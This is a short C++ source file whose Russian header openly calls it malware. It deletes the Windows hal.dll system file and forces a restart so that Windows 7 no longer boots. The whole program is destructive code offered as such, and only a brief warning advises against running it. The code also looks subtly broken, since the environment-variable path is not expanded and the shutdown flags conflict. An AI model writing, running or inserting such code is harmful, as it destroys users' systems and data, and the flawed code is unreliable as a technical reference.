/*++

    Hal for Windows
    Copyright (c) S-Patriarch, 2023

    Небольшая вредоносная программа.
    Программа удаляет файл hal.dll и перезагружает систему.
    После перезагрузки Windows уже не запустится. Программа работает
    только в Windows 7 - в Windows 10 встроенный антивирус не позволит
    удалить системный файл.

    Запускать ее на своем компьютере не рекомендуется.

--*/

#include <iostream>
#include <cstdlib>

//////////////////////////////////////////////////////////////////////
int main()
{
    std::remove("%systemroot%\\system32\\hal.dll");
    std::system("shutdown -s -r");

    return EXIT_SUCCESS;
}
